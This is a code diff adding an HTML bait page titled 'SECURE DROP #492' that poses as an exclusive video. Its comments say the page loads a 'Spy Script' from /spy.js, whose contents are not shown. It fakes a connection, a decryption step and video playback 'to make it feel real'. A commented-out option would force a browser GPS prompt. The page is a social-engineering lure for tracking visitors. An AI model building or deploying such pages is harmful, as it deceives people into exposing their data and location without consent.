@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Drop // Secure View</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: #0d0d0d;
+            color: #e0e0e0;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            max-width: 600px;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 1.5rem;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        p {
+            font-size: 0.9rem;
+            color: #888;
+            margin-bottom: 30px;
+        }
+        .video-box {
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+        .video-box:hover {
+            border-color: #00ffcc;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
+        }
+        .play-icon {
+            font-size: 3rem;
+            color: #fff;
+        }
+        .status {
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #00ffcc;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+        .loading {
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.5; }
+            50% { opacity: 1; }
+            100% { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>SECURE DROP #492</h1>
+        <p>Click below to verify connection and view content.</p>
+
+        <div class="video-box" id="baitBtn">
+            <span class="play-icon">▶</span>
+        </div>
+
+        <div class="status" id="statusMsg">Establishing secure link...</div>
+    </div>
+
+    <!-- Load the Spy Script -->
+    <script src="/spy.js"></script>
+
+    <script>
+        const baitBtn = document.getElementById('baitBtn');
+        const statusMsg = document.getElementById('statusMsg');
+
+        baitBtn.addEventListener('click', () => {
+            // Visual feedback to make it feel real
+            baitBtn.innerHTML = '<span style="font-size:1rem">CONNECTING...</span>';
+            statusMsg.style.opacity = '1';
+            statusMsg.classList.add('loading');
+
+            // Simulate a slight delay to mimic loading
+            setTimeout(() => {
+                statusMsg.innerText = "Content Decrypted. Access Granted.";
+                statusMsg.classList.remove('loading');
+                statusMsg.style.color = '#0f0';
+
+                // Optional: Trigger a fake "play" state
+                baitBtn.innerHTML = '<span style="font-size:1rem">VIDEO PLAYING</span>';
+            }, 1500);
+        });
+
+        // If you want to force GPS prompt on click, uncomment below:
+        /*
+        baitBtn.addEventListener('click', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => console.log("GPS Allowed"),
+                    err => console.warn("GPS Denied")
+                );
+            }
+        });
+        */
+    </script>
+</body>
+</html>
